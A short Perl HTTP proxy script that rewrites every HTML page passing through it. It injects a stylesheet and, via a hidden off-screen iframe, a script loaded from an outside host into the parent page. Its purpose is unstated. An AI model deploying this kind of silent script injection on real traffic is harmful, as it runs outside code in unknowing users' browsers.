#!/usr/local/bin/perl

use HTTP::Proxy qw(:log);
use HTTP::Proxy::BodyFilter::simple;

my $INSERT = <<END;
<script>
(function(d) {
    var iframe = d.body.appendChild(d.createElement('iframe')), doc = iframe.contentWindow.document;
        iframe.src = 'about:blank';
        iframe.style.cssText = "position:absolute;width:1px;height:1px;left:-9999px;";
    doc.open().write('<body onload="YUI_config={win:window.parent,doc:window.parent.document};var d=document;d.getElementsByTagName(\\'head\\')[0].appendChild(d.createElement(\\'script\\')).src=\\'http://ps48174.dreamhostps.com:8081/together\\';"><script src="http://yui.yahooapis.com/combo?3.3.0/build/yui/yui-min.js&3.3.0/build/loader/loader-min.js"><\\/script><\\/body>');
    doc.close();
})(document);
</script>
END

my $hostname = 'ps48174.dreamhostps.com:8081';
my $css = '<link rel="stylesheet" href="http://' . $hostname . '/footer.css" type="text/css" />';

# init
my $proxy = HTTP::Proxy->new( port => 8080, host => '', max_clients => 100 );
$proxy->push_filter(
    mime     => 'text/html',
    response => HTTP::Proxy::BodyFilter::simple->new(
        sub {
            ${ $_[1] } =~ s!<head(.*?)>!<head$1>$css!i;
#            ${ $_[1] } =~ s!<body(.*?)>!<body$1><div id="WWWrapper"><div id="CCContent">!i;
#            ${ $_[1] } =~ s!</body>!</div></div>$INSERT</body>!i; 
            ${ $_[1] } =~ s!</body>!$INSERT</body>!i; 
        }
    )
);

print "Ready to rumble on " . $proxy->host . ':' . $proxy->port . "\n";
$proxy->start;
